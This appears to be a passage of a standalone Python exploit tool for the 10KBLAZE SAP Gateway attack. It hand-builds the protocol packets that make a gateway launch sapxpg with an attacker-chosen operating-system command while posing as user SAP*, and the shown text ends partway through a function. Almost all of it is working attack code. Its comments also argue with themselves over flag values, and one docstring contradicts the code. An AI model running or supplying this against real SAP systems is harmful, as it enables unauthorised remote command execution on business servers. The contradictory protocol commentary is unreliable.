#!/usr/bin/env python3
"""
Standalone SAP Gateway SAPXPG command execution tool (10KBLAZE technique).
For authorized security testing only.

Uses only Python 3 stdlib (socket, struct, argparse) - no pysap/scapy dependency.
Replicates the protocol flow of the pysap-based Python 2 scripts.

Protocol flow:
  P1: GW_NORMAL_CLIENT  - Register with the SAP Gateway
  P2: F_SAP_INIT        - Start sapxpg conversation (STARTED_PRG)
  P3: F_SAP_SEND        - SAPXPG_START_XPG_LONG (execute command)
  P4: F_SAP_SEND        - SAPXPG_END_XPG (retrieve output, optional)
"""

import sys
import socket
import struct
import argparse


# ---------------------------------------------------------------------------
# SAP NI (Network Interface) framing helpers
# ---------------------------------------------------------------------------

def ni_send(sock, payload):
    """Send a payload with 4-byte big-endian length prefix (SAP NI framing)."""
    header = struct.pack("!I", len(payload))
    sock.sendall(header + payload)


def ni_recv(sock, timeout=10):
    """Receive one SAP NI frame: 4-byte length prefix + payload."""
    sock.settimeout(timeout)
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            raise ConnectionError("Connection closed while reading NI header")
        hdr += chunk
    length = struct.unpack("!I", hdr)[0]
    if length > 0x100000:  # sanity: 1 MB max
        raise ValueError("NI frame too large: %d bytes" % length)
    data = b""
    while len(data) < length:
        chunk = sock.recv(min(length - len(data), 65536))
        if not chunk:
            raise ConnectionError("Connection closed while reading NI payload")
        data += chunk
    return data


# ---------------------------------------------------------------------------
# TLV (Tag-Length-Value) helpers for CPIC fields
# ---------------------------------------------------------------------------

def build_tlv(tag_bytes, value):
    """Build a CPIC TLV: 4-byte tag + 2-byte big-endian length + value bytes."""
    if isinstance(value, str):
        value = value.encode("ascii")
    if isinstance(tag_bytes, str):
        tag_bytes = tag_bytes.encode("latin-1")
    return tag_bytes + struct.pack("!H", len(value)) + value


def pad_right(s, length, pad_char=b" "):
    """Pad a string/bytes to a fixed length with a pad character."""
    if isinstance(s, str):
        s = s.encode("ascii")
    if isinstance(pad_char, str):
        pad_char = pad_char.encode("ascii")
    if len(s) >= length:
        return s[:length]
    return s + pad_char * (length - len(s))


def pad_right_null(s, length):
    """Pad with null bytes to a fixed length."""
    return pad_right(s, length, b"\x00")


def ip_to_bytes(ip_str):
    """Convert dotted-quad IP string to 4 bytes."""
    return socket.inet_aton(ip_str)


# ---------------------------------------------------------------------------
# P1 - GW_NORMAL_CLIENT (version=2, 64 bytes)
# ---------------------------------------------------------------------------

def build_p1(target_ip, instance):
    """Build GW_NORMAL_CLIENT registration packet (64 bytes)."""
    service = "sapgw%s" % instance
    tp = "sapgw%s" % instance

    p = b""
    p += struct.pack("B", 0x02)             # version = 2
    p += struct.pack("B", 0x03)             # req_type = GW_NORMAL_CLIENT
    p += ip_to_bytes(target_ip)             # address (4 bytes)
    p += b"\x00" * 4                        # padd1
    p += pad_right(service, 10, b" ")        # service (10 bytes, space-padded)
    p += b"4103"                            # codepage (4 bytes ASCII, pysap uses int 4103 -> "4103")
    p += b"\x00" * 6                        # padd2
    p += pad_right_null("sapserve", 8)      # lu (8 bytes)
    p += pad_right(tp, 8, b" ")              # tp (8 bytes, space-padded)
    p += b" " * 8                           # conversation_id (8 spaces)
    p += struct.pack("B", 0x06)             # appc_header_version
    p += struct.pack("B", 0x0B)             # accept_info (EINFO+PING+CONN_EINFO)
    p += struct.pack("!h", -1)              # idx = -1 (signed short, big-endian)
    p += struct.pack("!I", 0)               # rc
    p += struct.pack("B", 0)                # echo_data
    p += struct.pack("B", 0)                # filler

    assert len(p) == 64, "P1 should be 64 bytes, got %d" % len(p)
    return p


# ---------------------------------------------------------------------------
# P2 - F_SAP_INIT (version=6)
# SAPRFC header (48 bytes) + SAPRFCEXTEND (32 bytes) +
# cm_ok_padd (32 bytes) + SAPRFCDTStruct (340 bytes)
# Total: 452 bytes
# ---------------------------------------------------------------------------

def build_saprfc_header_v6(func_type, gw_id=0xFFFF, uid=19, err_len=0,
                           info2=0x01, trace_level=0, time_val=0,
                           info3=0xC0, timeout=-1, info4=0, seq_no=0,
                           sap_param_len=0, padd_appc=0,
                           info=0x00C9, vector=0, appc_rc=0, sap_rc=0,
                           conv_id=None):
    """Build 48-byte SAPRFC v6 header.

    Flag field encoding (from pysap):
      info2 (8 bits): bit0=WITH_LONG_LU_NAME, bit1=GW_IMMEDIATE, bit2=GW_SNC_ACTIVE,
                      bit3=GW_WAIT_LOOK_UP, bit4=SNC_INIT_PHASE, bit5=GW_STATELESS
      info3 (8 bits): bit0=GW_WITH_CODE_PAGE, bit1=GW_ASYNC_RFC, bit2=GW_CANCEL_HARD,
                      bit3=GW_CANCEL_SOFT, bit4=GW_WITH_GUI_TIMEOUT, bit5=GW_TERMIO_ERROR,
                      bit6=GW_EXTENDED_INIT_OPTIONS, bit7=GW_DIST_TRACE
      info (16 bits): bit0=SYNC_CPIC_FUNCTION, bit1=WITH_HOSTADDR, bit2=WITH_GW_SAP_PARAMS_HDR,
                      bit3=CPIC_SYNC_REQ, bit4=WITH_ERR_INFO, bit5=DATA_WITH_TERM_OUTPUT,
                      bit6=DATA_WITH_TERM_INPUT, bit7=R3_CPIC_LOGIN_WITH_TERM
      vector (8 bits): bit0=F_V_INITIALIZE_CONVERSATION, bit1=F_V_ALLOCATE, bit2=F_V_SEND_DATA,
                       bit3=F_V_RECEIVE, bit4=F_V_FLUSH
    """
    # pysap StrFixedLenField("conv_id", 0, 8) default: int 0 -> b"0\x00..."
    if conv_id is None:
        conv_id = b"0" + b"\x00" * 7
    elif isinstance(conv_id, str):
        conv_id = conv_id.encode("ascii")
    conv_id = pad_right_null(conv_id, 8)

    h = b""
    h += struct.pack("B", 0x06)             # version = 6
    h += struct.pack("B", func_type)        # func_type
    h += struct.pack("B", 0x03)             # protocol = CPIC
    h += struct.pack("B", 0x00)             # mode
    h += struct.pack("!H", uid)             # uid
    h += struct.pack("!H", gw_id)           # gw_id
    h += struct.pack("!H", err_len)         # err_len
    h += struct.pack("B", info2)            # info2 flags
    h += struct.pack("B", trace_level)      # trace_level
    h += struct.pack("!I", time_val)        # time
    h += struct.pack("B", info3)            # info3 flags
    h += struct.pack("!i", timeout)         # timeout (signed)
    h += struct.pack("B", info4)            # info4
    h += struct.pack("!I", seq_no)          # seq_no
    h += struct.pack("!H", sap_param_len)   # sap_param_len
    h += struct.pack("B", padd_appc)        # padd_appc
    h += struct.pack("!H", info)            # info flags (16-bit)
    h += struct.pack("B", vector)           # vector flags
    h += struct.pack("!I", appc_rc)         # appc_rc
    h += struct.pack("!I", sap_rc)          # sap_rc
    h += conv_id[:8]                        # conv_id (8 bytes)

    assert len(h) == 48, "SAPRFC v6 header should be 48 bytes, got %d" % len(h)
    return h


def build_saprfcextend(dest_name, ncpic_lu, ncpic_tp, ctype=0x45, client_info=1,
                       comm_idx=0, conn_idx=0xFFFF):
    """Build SAPRFCEXTEND structure (32 bytes)."""
    e = b""
    e += pad_right(dest_name, 8, b" ")      # short_dest_name (space-padded)
    e += pad_right_null(ncpic_lu, 8)        # ncpic_lu (null-padded, fills exactly 8)
    e += pad_right(ncpic_tp, 8, b" ")       # ncpic_tp (space-padded)
    e += struct.pack("B", ctype)            # ctype (0x45 = STARTED_PRG)
    e += struct.pack("B", client_info)      # clientInfo
    e += b"\x00\x00"                        # ncpic_parameters_padd
    e += struct.pack("!H", comm_idx)        # comm_idx
    e += struct.pack("!H", conn_idx)        # conn_idx

    assert len(e) == 32, "SAPRFCEXTEND should be 32 bytes, got %d" % len(e)
    return e


def build_saprf_dt_struct(target_ip, long_tp="sapxpg"):
    """Build SAPRFCDTStruct (340 bytes) for STARTED_PRG init."""
    # IPv6-mapped IPv4 for local_addrv6 = "::192.168.x.x"
    ipv6_mapped = b"\x00" * 12 + ip_to_bytes(target_ip)

    d = b""
    d += struct.pack("B", 0x60)                         # version = 96
    d += b"\x00" * 8                                    # padd1
    d += b"\x0E\x02\x00\x00\x00\x00\xE8\x4D\x23\x00\xDF\x07\x00\x00\x01\x00"  # root_id (16 bytes)
    d += b"\x4E\xD5\x81\xE3\x09\xF6\xF1\x18\xA0\x0A\x00\x0C\x29\x00\x99\xD0"  # conn_id (16 bytes)
    d += struct.pack("!I", 0)                           # conn_id_suff
    d += struct.pack("!i", -1)                          # timeout
    d += struct.pack("!i", -1)                          # keepalive_timeout
    d += struct.pack("B", 2)                            # export_trace
    d += struct.pack("B", 0)                            # start_type = DEFAULT
    d += struct.pack("B", 10)                           # net_protocol
    d += ipv6_mapped                                    # local_addrv6 (16 bytes)
    d += pad_right_null(target_ip, 128)                 # long_lu (128 bytes)
    d += b"\x00" * 16                                   # padd3
    d += pad_right("SAP*", 12, b" ")                     # user (12 bytes, space-padded)
    d += b"\x20" * 8                                    # padd4
    d += b"\x00" * 4                                    # padd5
    d += b"\x20" * 12                                   # padd6
    d += b"\x00" * 16                                   # padd7
    d += ip_to_bytes(target_ip)                         # addr_ipv4
    d += b"\x00" * 4                                    # padd8
    d += pad_right_null(long_tp, 64)                    # long_tp (64 bytes)

    assert len(d) == 340, "SAPRFCDTStruct should be 340 bytes, got %d" % len(d)
    return d


def build_p2(target_ip, dest_name="T_75"):
    """Build F_SAP_INIT packet (452 bytes).

    info2=0x01 (WITH_LONG_LU_NAME)
    info3=0xC0 (GW_EXTENDED_INIT_OPTIONS | GW_DIST_TRACE)
    info=0x00C9 (SYNC_CPIC_FUNCTION | WITH_HOSTADDR | WITH_GW_SAP_PARAMS_HDR | R3_CPIC_LOGIN_WITH_TERM) = bits 0,3... wait
    """
    # pysap flag encoding:
    # info = SYNC_CPIC_FUNCTION(bit0) + WITH_HOSTADDR(bit1) + WITH_GW_SAP_PARAMS_HDR(bit2) + R3_CPIC_LOGIN_WITH_TERM(bit7)
    # = 0x0001 | 0x0002 | 0x0004 | 0x0080 = 0x0087
    # But the Python 2 script uses these specific symbolic names.
    # Let me trace through pysap's FlagsField to get the right value.
    #
    # pysap FlagsField for info (16 bits):
    #   bit0 = SYNC_CPIC_FUNCTION    -> 0x0001
    #   bit1 = WITH_HOSTADDR         -> 0x0002
    #   bit2 = WITH_GW_SAP_PARAMS_HDR -> 0x0004
    #   bit3 = CPIC_SYNC_REQ         -> 0x0008
    #   bit4 = WITH_ERR_INFO         -> 0x0010
    #   bit5 = DATA_WITH_TERM_OUTPUT -> 0x0020
    #   bit6 = DATA_WITH_TERM_INPUT  -> 0x0040
    #   bit7 = R3_CPIC_LOGIN_WITH_TERM -> 0x0080
    #
    # SYNC_CPIC_FUNCTION + WITH_HOSTADDR + WITH_GW_SAP_PARAMS_HDR + R3_CPIC_LOGIN_WITH_TERM
    # = 0x0001 + 0x0002 + 0x0004 + 0x0080 = 0x0087
    #
    # info2 = WITH_LONG_LU_NAME (bit0) = 0x01
    #
    # info3 = GW_EXTENDED_INIT_OPTIONS(bit6) + GW_DIST_TRACE(bit7)
    # = 0x40 + 0x80 = 0xC0
    #
    # vector=0 (no vector flags for INIT)

    dt = build_saprf_dt_struct(target_ip)

    header = build_saprfc_header_v6(
        func_type=0xCA,         # F_SAP_INIT = 202
        gw_id=0xFFFF,
        uid=19,
        info2=0x01,             # WITH_LONG_LU_NAME
        info3=0xC0,             # GW_EXTENDED_INIT_OPTIONS | GW_DIST_TRACE
        timeout=-1,
        sap_param_len=len(dt),  # 340
        info=0x0087,            # SYNC_CPIC_FUNCTION + WITH_HOSTADDR + WITH_GW_SAP_PARAMS_HDR + R3_CPIC_LOGIN_WITH_TERM
        vector=0,
    )

    ext = build_saprfcextend(
        dest_name=dest_name,
        ncpic_lu="172.16.0",
        ncpic_tp="sapxpg",
        ctype=0x45,             # STARTED_PRG
        conn_idx=0xFFFF,
    )

    # pysap StrFixedLenField("cm_ok_padd", 0, 32) with default int 0
    # produces b"0" + b"\x00"*31 (scapy converts int->str)
    cm_ok = b"0" + b"\x00" * 31

    p = header + ext + cm_ok + dt
    assert len(p) == 452, "P2 should be 452 bytes, got %d" % len(p)
    return p


# ---------------------------------------------------------------------------
# P3 - F_SAP_SEND with SAPXPG_START_XPG_LONG
# ---------------------------------------------------------------------------

def build_sapcpic_suffix(kernel, platform="Linux x86_64", client_name="pysap client"):
    """Build SAPCPICSUFFIX - TLV-encoded suffix block."""
    s = b""
    # Each entry: 3-byte tag + 2-byte length + value
    entries = [
        (b"\x10\x04\x02", b"\x00\x01\x87\x68\x00\x00\x04\x4c\x00\x00\x0b\xb8"),
        (b"\x10\x04\x0b", b"\xff\x7f\xfa\x0d\x78\xb7\x27\xde\xf6\x19\x62\x93\x25\xbf\x15\x93\xef\x73\xfe\xeb\xdb\x51\xed\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
        (b"\x10\x04\x04", b"\x00\x16\x00\x07\x00\x10\x00\x07"),
        (b"\x10\x04\x0d", b"\x00\x00\x00\x27\x00\x00\x01\x0c\x00\x00\x00\x35\x00\x00\x01\x0c"),
        (b"\x10\x04\x16", b"\x00\x11"),
        (b"\x10\x04\x17", b"\x00\x22"),
        (b"\x10\x04\x19", b"\x00\x00"),
        (b"\x10\x04\x1e", b"\x00\x00\x03\x67\x00\x00\x07\x58"),
        (b"\x10\x04\x25", b"\x00\x01"),                    # suff_unk9 = 0x0001 (triggers Windows-style extra fields)
        (b"\x10\x04\x09", kernel.encode("ascii")),          # suff_kernel
        (b"\x10\x04\x1d", b"\x30"),                         # suff_unk10
        (b"\x10\x04\x1f", platform.encode("ascii")),        # suff_cli1 (OS platform)
        (b"\x10\x04\x20", client_name.encode("ascii")),     # suff_cli2 (client name)
        (b"\x10\x04\x21", b"pysap"),                        # suff_cli3 (client desc)
        (b"\x10\x04\x24", b"\x00\x00\x04\x1a\x00\x00\x07\x80"),
        (b"\x10\x04\x13", b"\x02\xe1\xd4\x81\xe3\x0b\x21\xf1\x01\xa0\x0a\x00\x0c\x29\x00\x99\xd0\x01\x37\xd5\x81\xe3\x88\x9a\xf1\x6b\xa0\x0a\x00\x0c\x29\x00\x99\xd0\x00"),
    ]

    for tag, val in entries:
        s += tag + struct.pack("!H", len(val)) + val

    return s


def build_saprfc_th_struct(sid, hostname, instance, target_ip):
    """Build SAPRFCTHStruct (230 bytes) including embedded SAPCPICPARAM."""
    sysid_str = "%s/%s_%s_%s" % (sid, hostname, sid, instance)

    cpic_param = b""
    cpic_param += b"\x01\x00\x0c\x29"              # pref
    cpic_param += b"\x00\x99\xd0\x1e"               # param1
    cpic_param += b"\xe3\xa0\xba\x9a\xec\xea\x55\x80\x0a\x4e\xd5"  # param2
    cpic_param += b"\x81\xe3"                        # param_sess_1
    cpic_param += b"\x09\xf6\xf1\x18"               # param_sess_2
    cpic_param += ip_to_bytes("225.0.0.0")           # mask
    cpic_param += ip_to_bytes(target_ip)             # ip
    cpic_param += struct.pack("!I", 1)               # flag

    th = b""
    th += b"*TH*"                                    # th_eyec1
    th += struct.pack("B", 3)                        # th_version
    th += struct.pack("!H", 230)                     # th_len
    th += struct.pack("!H", 0)                       # th_trace_flag
    th += pad_right(sysid_str, 32, b" ")             # th_sysid (space-padded)
    th += struct.pack("!H", 1)                       # th_service
    th += pad_right("SAP*", 32, b" ")                # th_userid (space-padded)
    th += pad_right("SM49", 40, b" ")                # th_action (space-padded)
    th += pad_right(sysid_str, 32, b" ")             # th_presysid (space-padded)
    th += struct.pack("!H", 1)                       # th_acttype
    th += pad_right_null("37D581E3889AF16DA00A000C290099D0001", 35)  # th_id
    th += struct.pack("B", 0)                        # th_unused_comm1
    th += cpic_param                                 # th_some_cpic_params (33 bytes)
    th += b"\x00\x00\x00\xe2"                        # th_unused_comm2
    th += b"*TH*"                                    # th_eyec2

    assert len(th) == 230, "TH struct should be 230 bytes, got %d" % len(th)
    return th


def build_saprfxpg(command, params):
    """Build SAPRFXPG structure for SAPXPG_START_XPG_LONG."""
    # Pad command to 128 bytes, params to 1024 and 255 bytes (space-padded)
    extprog = pad_right(command, 128, b" ")
    longparam = pad_right(params, 1024, b" ")
    param = pad_right(params, 255, b" ")

    xpg = b""
    # CONVID label
    xpg += build_tlv(b"\x05\x12\x02\x05", b"CONVID")
    # STRTSTAT label
    xpg += build_tlv(b"\x02\x05\x02\x05", b"STRTSTAT")
    # XPGID label
    xpg += build_tlv(b"\x02\x05\x02\x05", b"XPGID")
    # EXTPROG label
    xpg += build_tlv(b"\x02\x05\x02\x01", b"EXTPROG")
    # EXTPROG value (128 bytes)
    xpg += build_tlv(b"\x02\x01\x02\x03", extprog)
    # LONG_PARAMS label
    xpg += build_tlv(b"\x02\x03\x02\x01", b"LONG_PARAMS")
    # LONG_PARAMS value (1024 bytes)
    xpg += build_tlv(b"\x02\x01\x02\x03", longparam)
    # PARAMS label
    xpg += build_tlv(b"\x02\x03\x02\x01", b"PARAMS")
    # PARAMS value (255 bytes)
    xpg += build_tlv(b"\x02\x01\x02\x03", param)
    # STDERRCNTL label + value
    xpg += build_tlv(b"\x02\x03\x02\x01", b"STDERRCNTL")
    xpg += build_tlv(b"\x02\x01\x02\x03", b"M")
    # STDINCNTL label + value
    xpg += build_tlv(b"\x02\x03\x02\x01", b"STDINCNTL")
    xpg += build_tlv(b"\x02\x01\x02\x03", b"R")
    # STDOUTCNTL label + value (changed to empty string to match pysap 'PARAMS' default? No - sap_gw_xpg.py sets it to 'R')
    # Actually looking at the script: stdincntl_val='R', but the field definition has default 'PARAMS'.
    # The actual script sets: xpg_stdincntl_val='R'
    # and: xpg_stdoutcntl_val='M'
    xpg += build_tlv(b"\x02\x03\x02\x01", b"STDOUTCNTL")
    xpg += build_tlv(b"\x02\x01\x02\x03", b"M")
    # TERMCNTL label + value
    xpg += build_tlv(b"\x02\x03\x02\x01", b"TERMCNTL")
    xpg += build_tlv(b"\x02\x01\x02\x03", b"C")
    # TRACECNTL label + value
    xpg += build_tlv(b"\x02\x03\x02\x01", b"TRACECNTL")
    # Note: pysap has two padd fields here (padd117 and padd118) both leading with same tag
    # padd117 = \x02\x03\x02\x01 for TRACECNTL label
    # padd118 = \x02\x01\x02\x03 for TRACECNTL value -- but wait, this is wrong.
    # Looking at pysap: padd118 = "\x02\x01\x02\x03" -- but the field is xpg_tracecntl_val
    # Actually pysap definition says:
    #   xpg_padd117 = "\x02\x03\x02\x01" -- for tracecntl_l label  (not used, tracecntl value is '6')
    #   xpg_padd118 = "\x02\x03\x02\x01" -- wait, that's wrong
    # Let me re-check: In SAPRFXPG:
    #   xpg_padd117 = "\x02\x03\x02\x01"  -> tracecntl_l label
    #   xpg_padd118 = "\x02\x03\x02\x01"  -> tracecntl_val_len + tracecntl_val
    # But wait - in pysap source: xpg_padd118 = "\x02\x03\x02\x01"? No:
    #   StrFixedLenField("xpg_padd117", "\x02\x03\x02\x01", length=4),
    #   xpg_tracecntl_l = 'TRACECNTL'
    #   StrFixedLenField("xpg_padd118", "\x02\x03\x02\x01", length=4),   <-- NOT \x02\x01\x02\x03
    #   xpg_tracecntl_val
    # Hmm, but the working script sets xpg_tracecntl_val='6' and both padd117/118 use default.
    # pysap defaults: xpg_padd118 = "\x02\x03\x02\x01"
    # Wait no - let me look again at the actual pysap source line 547-553:
    #   xpg_padd117 = "\x02\x03\x02\x01"  (line 547)
    #   xpg_tracecntl_l_len (auto)
    #   xpg_tracecntl_l = 'TRACECNTL'
    #   xpg_padd118 = "\x02\x03\x02\x01"  (line 551)  <-- THIS IS THE KEY: tag for tracecntl_val
    #   xpg_tracecntl_val_len (auto)
    #   xpg_tracecntl_val = ''
    # So pysap has xpg_padd118 = "\x02\x03\x02\x01" NOT "\x02\x01\x02\x03"!
    # But the working script overrides xpg_padd118='\x02\x01\x02\x03' (line 207 in xpg2.py)? No it doesn't!
    # The working script only sets: xpg_tracecntl_val='6' and uses default padds.
    # So: xpg_padd117 = "\x02\x03\x02\x01", xpg_padd118 = "\x02\x03\x02\x01"
    # But wait, the pattern for all other value fields uses \x02\x01\x02\x03 for the value tag.
    # Let me look more carefully at pysap:
    # Line 547: StrFixedLenField("xpg_padd117", "\x02\x03\x02\x01", length=4)
    # Line 548: FieldLenField("xpg_tracecntl_l_len"...)
    # Line 549: StrLenField("xpg_tracecntl_l", "TRACECNTL"...)
    # Line 551: StrFixedLenField("xpg_padd118", "\x02\x03\x02\x01", length=4)  <--
    # Line 552: FieldLenField("xpg_tracecntl_val_len"...)
    # Line 553: StrLenField("xpg_tracecntl_val", ""...)
    #
    # But the working scripts override this to '\x02\x01\x02\x03':
    # sap_gw_xpg.py line 206-207: xpg_padd118='\x02\x01\x02\x03', xpg_tracecntl_val='6'
    # So the WORKING script uses \x02\x01\x02\x03 for the tracecntl value tag.
    xpg += build_tlv(b"\x02\x01\x02\x03", b"6")
    # LOG label
    xpg += build_tlv(b"\x02\x03\x03\x01", b"LOG")
    # LOG value1
    xpg += build_tlv(b"\x03\x01\x03\x30", b"\x00\x00\x00\x01")
    # LOG unk1
    xpg += build_tlv(b"\x03\x30\x03\x02", b"\x00\x00\x00\x80\x00\x00\x00\x00")

    return xpg


def build_sapcpicparam(target_ip, flag=1):
    """Build SAPCPICPARAM (33 bytes)."""
    p = b""
    p += b"\x01\x00\x0c\x29"                    # pref (4 bytes)
    p += b"\x00\x99\xd0\x1e"                    # param1 (4 bytes)
    p += b"\xe3\xa0\xba\x9a\xec\xea\x55\x80\x0a\x4e\xd5"  # param2 (11 bytes)
    p += b"\x81\xe3"                             # param_sess_1 (2 bytes)
    p += b"\x09\xf6\xf1\x18"                    # param_sess_2 (4 bytes)
    p += ip_to_bytes("225.0.0.0")                # mask (4 bytes)
    p += ip_to_bytes(target_ip)                  # ip (4 bytes)
    p += struct.pack("!I", flag)                 # flag (4 bytes)
    return p


def build_sapcpicparam2():
    """Build SAPCPICPARAM2 (16 bytes)."""
    p = b""
    p += b"\xe3\x81\xd5\x4e\xf6\x09\x19\xf1"   # param1 (8 bytes)
    p += ip_to_bytes("160.10.0.12")              # mask (4 bytes)
    p += ip_to_bytes("41.0.153.208")             # ip (4 bytes)
    return p


def build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, command, params):
    """Build the full SAPCPIC structure for SAPXPG_START_XPG_LONG."""
    host_sid_inbr = "%s_%s_%s" % (hostname, sid, instance)

    th = build_saprfc_th_struct(sid, hostname, instance, target_ip)
    cpic_param_data = build_sapcpicparam(target_ip, flag=1)
    cpic_param2_data = build_sapcpicparam2()
    xpg = build_saprfxpg(command, params)
    suffix = build_sapcpic_suffix(kernel)

    c = b""
    # SAPCPIC metadata TLVs
    c += b"\x01\x01\x00\x08"                        # cpic_start_padd
    c += struct.pack("!H", 257)                      # cpic_cpic_length

    c += b"\x01\x01\x01\x01"                        # cpic_padd0003 (cpic_unk02_padd)
    c += struct.pack("!H", 0)                        # cpic_unk02_len = 0 (empty)

    c += b"\x01\x01\x01\x03"                        # cpic_padd0002 (cpic_unk01_padd)
    c += struct.pack("!H", 4) + b"\x00\x00\x06\x1b" # cpic_unk01

    c += b"\x01\x03\x01\x06"                        # cpic_padd0001 (cpic_unk00_padd)
    c += struct.pack("!H", 11) + b"\x04\x01\x00\x03\x01\x03\x02\x00\x00\x00\x23"  # cpic_unk00

    c += build_tlv(b"\x01\x06\x00\x07", pad_right(target_ip, 15, b" "))   # cpic_ip (15 bytes, space-padded)
    c += build_tlv(b"\x00\x07\x00\x18", target_ip.encode("ascii"))        # cpic_ip2
    c += build_tlv(b"\x00\x18\x00\x08", host_sid_inbr.encode("ascii"))    # cpic_host_sid_inbr
    c += build_tlv(b"\x00\x08\x00\x11", b"3")                             # cpic_rfc_type
    c += build_tlv(b"\x00\x11\x00\x13", (kernel + " ").encode("ascii"))   # cpic_kernel1
    c += build_tlv(b"\x00\x13\x00\x12", (kernel + " ").encode("ascii"))   # cpic_kernel2
    c += build_tlv(b"\x00\x12\x00\x06", dest.encode("ascii"))             # cpic_dest
    c += build_tlv(b"\x00\x06\x01\x30", b"SAPLSSXP")                      # cpic_program
    c += build_tlv(b"\x01\x30\x01\x11", b"SAP*")                          # cpic_username1
    c += build_tlv(b"\x01\x11\x01\x14", client.encode("ascii"))           # cpic_cli_nbr1
    c += build_tlv(b"\x01\x14\x01\x15", b"E")                             # cpic_unk1
    c += build_tlv(b"\x01\x15\x00\x09", b"SAP*")                          # cpic_username2
    c += build_tlv(b"\x00\x09\x01\x34", client.encode("ascii"))           # cpic_cli_nbr2
    c += build_tlv(b"\x01\x34\x05\x01", b"\x01")                          # cpic_unk2

    # "Dirty fix" split: cpic_padd015_0 (2 bytes) + cpic_padd015_1 (2 bytes)
    c += b"\x05\x01"                                                       # cpic_padd015_0
    c += b"\x01\x36"                                                       # cpic_padd015_1
    c += struct.pack("!H", len(cpic_param_data)) + cpic_param_data         # some_cpic_params

    c += b"\x01\x36\x05\x02"                                              # cpic_padd016 (cpic_convid_label_padd)
    c += struct.pack("!H", 0)                                              # cpic_convid_label (empty)

    c += build_tlv(b"\x05\x02\x00\x0b", kernel.encode("ascii"))           # cpic_kernel3
    c += build_tlv(b"\x00\x0b\x01\x02", b"SAPXPG_START_XPG_LONG")         # cpic_RFC_f

    c += b"\x01\x02\x05\x03"                                              # cpic_padd019 (cpic_unk4_padd)
    c += struct.pack("!H", 0)                                              # cpic_unk4 (empty)

    c += b"\x05\x03\x01\x31"                                              # cpic_padd020 (cpic_th_struct_padd)
    c += struct.pack("!H", len(th)) + th                                   # cpic_th_struct

    c += b"\x01\x31\x05\x14"                                              # cpic_padd021 (cpic_some_params2_padd)
    c += struct.pack("!H", len(cpic_param2_data)) + cpic_param2_data       # some_cpic_params2

    c += build_tlv(b"\x05\x14\x04\x20", b"\x00\x00\x00\x00")             # cpic_unk6
    c += b"\x04\x20\x05\x12"                                              # cpic_padd023
    c += struct.pack("!H", 0)                                              # cpic_unk7 (empty)

    # XPG payload
    c += xpg

    # CPIC suffix
    c += b"\x03\x02\x01\x04"                                              # cpic_padd024 (cpic_suff_padd)
    c += struct.pack("!H", len(suffix)) + suffix                           # cpic_suff

    c += b"\x01\x04\xff\xff"                                              # cpic_end_padd
    c += struct.pack("!H", 0)                                              # cpic_end (empty)

    c += b"\xff\xff\x00\x00"                                              # cpic_end_sig
    # Note: pysap default is "\x00\x00\xff\xff" but the working script sets '\xff\xff\x00\x00'

    return c


def build_p3(conv_id, target_ip, hostname, sid, instance, kernel, dest, client, command, params):
    """Build F_SAP_SEND packet with SAPXPG_START_XPG_LONG.

    info = SYNC_CPIC_FUNCTION + WITH_GW_SAP_PARAMS_HDR + R3_CPIC_LOGIN_WITH_TERM
         = 0x0001 + 0x0004 + 0x0080 = 0x0085
    vector = F_V_SEND_DATA(bit2) + F_V_RECEIVE(bit3) = 0x04 + 0x08 = 0x0C
    """
    cpic = build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, command, params)

    header = build_saprfc_header_v6(
        func_type=0xCB,         # F_SAP_SEND = 203
        gw_id=1,
        uid=19,
        info2=0,
        info3=0,
        timeout=500,
        sap_param_len=8,
        info=0x0085,            # SYNC_CPIC_FUNCTION + WITH_GW_SAP_PARAMS_HDR + R3_CPIC_LOGIN_WITH_TERM
        vector=0x0C,            # F_V_SEND_DATA + F_V_RECEIVE
        conv_id=conv_id,
    )

    cm_ok = b"\x00" * 31 + b"\x02"  # cm_ok_padd (31 zeros + 0x02)

    p = header + cm_ok + cpic
    p += struct.pack("!H", len(cpic))   # cpic_packet_size
    p += struct.pack("!I", 28000)       # rfc_packet_size

    return p


# ---------------------------------------------------------------------------
# P4 - F_SAP_SEND with SAPXPG_END_XPG
# ---------------------------------------------------------------------------

def build_saprfxpg_end():
    """Build SAPRFXPG_END structure for SAPXPG_END_XPG."""
    x = b""
    x += build_tlv(b"\x05\x12\x02\x05", b"EXITCODE")
    x += build_tlv(b"\x02\x05\x02\x05", b"STRTSTAT")
    x += build_tlv(b"\x02\x05\x03\x01", b"LOG")
    x += build_tlv(b"\x03\x01\x03\x30", b"\x00\x00\x00\x01")
    x += build_tlv(b"\x03\x30\x03\x02", b"\x00\x00\x00\x80\x00\x00\x00\x00")
    return x


def build_sapcpic_end(target_ip, hostname, sid, instance, kernel, dest, client):
    """Build full SAPCPIC structure for SAPXPG_END_XPG.

    Uses the same full format as P3 (with TH struct and metadata TLVs)
    but with the SAPXPG_END_XPG function name and END payload.
    Kernel 793+ requires this full format; the shorter SAPCPIC2 format
    returns RFC_NOT_FOUND on newer kernels.
    """
    host_sid_inbr = "%s_%s_%s" % (hostname, sid, instance)

    th = build_saprfc_th_struct(sid, hostname, instance, target_ip)
    cpic_param_data = build_sapcpicparam(target_ip, flag=2)
    cpic_param2_data = build_sapcpicparam2()
    xpg_end = build_saprfxpg_end()
    suffix = build_sapcpic_suffix(kernel)

    c = b""
    c += b"\x01\x01\x00\x08"
    c += struct.pack("!H", 257)
    c += b"\x01\x01\x01\x01"
    c += struct.pack("!H", 0)
    c += b"\x01\x01\x01\x03"
    c += struct.pack("!H", 4) + b"\x00\x00\x06\x1b"
    c += b"\x01\x03\x01\x06"
    c += struct.pack("!H", 11) + b"\x04\x01\x00\x03\x01\x03\x02\x00\x00\x00\x23"

    c += build_tlv(b"\x01\x06\x00\x07", pad_right(target_ip, 15, b" "))
    c += build_tlv(b"\x00\x07\x00\x18", target_ip.encode("ascii"))
    c += build_tlv(b"\x00\x18\x00\x08", host_sid_inbr.encode("ascii"))
    c += build_tlv(b"\x00\x08\x00\x11", b"3")
    c += build_tlv(b"\x00\x11\x00\x13", (kernel + " ").encode("ascii"))
    c += build_tlv(b"\x00\x13\x00\x12", (kernel + " ").encode("ascii"))
    c += build_tlv(b"\x00\x12\x00\x06", dest.encode("ascii"))
    c += build_tlv(b"\x00\x06\x01\x30", b"SAPLSSXP")
    c += build_tlv(b"\x01\x30\x01\x11", b"SAP*")
